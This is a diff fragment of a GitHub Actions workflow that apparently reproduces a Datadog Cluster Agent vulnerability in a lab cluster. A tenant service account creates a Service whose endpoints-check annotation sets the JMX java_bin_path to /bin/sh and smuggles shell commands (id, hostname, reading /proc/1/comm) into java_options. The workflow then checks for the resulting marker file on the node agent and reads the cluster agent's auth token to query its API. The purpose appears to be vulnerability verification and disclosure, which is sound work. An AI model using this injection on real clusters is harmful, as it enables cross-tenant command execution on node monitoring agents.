+          kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_KUBERNETES_USE_ENDPOINT_SLICES DD_EXTRA_CONFIG_PROVIDERS
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- printenv DD_KUBERNETES_USE_ENDPOINT_SLICES DD_INTEGRATION_IGNORE_UNTRUSTED_FILE_PARAMS; echo gate_end
+
+          echo
+          echo "=== classic lane: Service + manual EndpointSlice only (no Endpoints object) ==="
+          cat > svc-classic.yaml <<'EOF'
+          apiVersion: v1
+          kind: Service
+          metadata:
+            name: ep-classic
+            namespace: tenant-a
+            annotations:
+              ad.datadoghq.com/endpoints.checks: |
+                {"jmx":{"instances":[{"loader":"jmx","java_bin_path":"/bin/sh","java_options":"-c id>/tmp/ep-classic-marker;hostname>>/tmp/ep-classic-marker;cat</proc/1/comm>>/tmp/ep-classic-marker"}]}}
+          spec:
+            ports:
+            - port: 80
+          EOF
+          kubectl create -f svc-classic.yaml --as=system:serviceaccount:tenant-a:ep-author || true
+          cat > classic-slice.yaml <<'EOF'
+          apiVersion: discovery.k8s.io/v1
+          kind: EndpointSlice
+          metadata:
+            name: ep-classic-1
+            namespace: tenant-a
+            labels:
+              kubernetes.io/service-name: ep-classic
+          addressType: IPv4
+          endpoints:
+          - addresses:
+            - 10.244.99.97
+            conditions:
+              ready: true
+          ports:
+          - port: 80
+            protocol: TCP
+          EOF
+          kubectl create -f classic-slice.yaml --as=system:serviceaccount:tenant-a:ep-author || true
+          sleep 50
+          echo "--- EndpointSlice only (classic provider reads Endpoints): no config expected ---"
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/endpointschecks/configs | head -c 2000
+          echo
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l /tmp/ep-classic-marker 2>&1' || true
+
+          echo
+          echo "=== classic lane: create the Endpoints object for ep-classic ==="
+          cat > classic-endpoints.yaml <<'EOF'
+          apiVersion: v1
+          kind: Endpoints
+          metadata:
+            name: ep-classic
+            namespace: tenant-a
+          subsets:
+          - addresses:
+            - ip: 10.244.99.97
+            ports:
+            - port: 80
+              protocol: TCP
+          EOF
+          kubectl create -f classic-endpoints.yaml --as=system:serviceaccount:tenant-a:ep-author || true
+          sleep 110
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/endpointschecks/configs | head -c 3000
+          echo
+          echo "=== DCA log (classic lane) ==="
+          kubectl -n datadog logs "$DCA_POD" -c cluster-agent --tail=8000 | grep -Ei "Dispatching configuration|ep-classic|Cannot get Kubernetes" | tail -40
+          echo
+          echo "=== node agent JMX log + marker (classic lane) ==="
+          kubectl -n datadog logs "$AGENT_POD" -c agent --tail=12000 | grep -Ei "Scheduling jmxfetch|Args:|ep-classic" | tail -40
+          kubectl -n datadog exec "$AGENT_POD" -c agent -- sh -c 'ls -l --time-style=full-iso /tmp/ep-classic-marker 2>&1; echo ---; cat /tmp/ep-classic-marker 2>&1' || true
+
+      - name: Final state and cleanup
+        if: always()
+        run: |
+          set +e
+          DCA_POD=$(kubectl -n datadog get pod -l app.kubernetes.io/component=cluster-agent -o jsonpath='{.items[0].metadata.name}')
+          TOKEN=$(kubectl -n datadog exec "$DCA_POD" -c cluster-agent -- printenv DD_CLUSTER_AGENT_AUTH_TOKEN)
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/endpointschecks/configs > "$LAB/evidence/99-final-endpoints.json" 2>&1
+          kubectl -n evidence exec curl -- curl -sk -m 20 -H "Authorization: Bearer $TOKEN" https://datadog-cluster-agent.datadog.svc:5005/api/v1/clusterchecks > "$LAB/evidence/99-final-clusterchecks.json" 2>&1
+          kubectl -n datadog get pods -o wide > "$LAB/evidence/99-final-pods.txt" 2>&1
+          kubectl -n tenant-a get svc,endpointslice,endpoints,configmap > "$LAB/evidence/99-final-tenant.txt" 2>&1
+          python3 - <<'PY'
+          import glob, re
+          for p in glob.glob("lab/evidence/*"):
+              try:
+                  s = open(p, errors="ignore").read()
+              except Exception:
+                  continue
+              s = re.sub(r'(api_key["\']?\s*[:=]\s*["\']?)[A-Za-z0-9]{20,}', r'\1<REDACTED>', s)
+              s = re.sub(r'(app_key["\']?\s*[:=]\s*["\']?)[A-Za-z0-9]{20,}', r'\1<REDACTED>', s)
+              s = re.sub(r'Bearer\s+[A-Za-z0-9._\-]{20,}', 'Bearer <REDACTED>', s)
+              open(p, "w").write(s)
+          PY
+          kubectl -n tenant-a delete svc,endpointslice,endpoints,configmap --all --ignore-not-found >/dev/null 2>&1
+          echo done
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: endpoints-evidence
+          path: lab/evidence
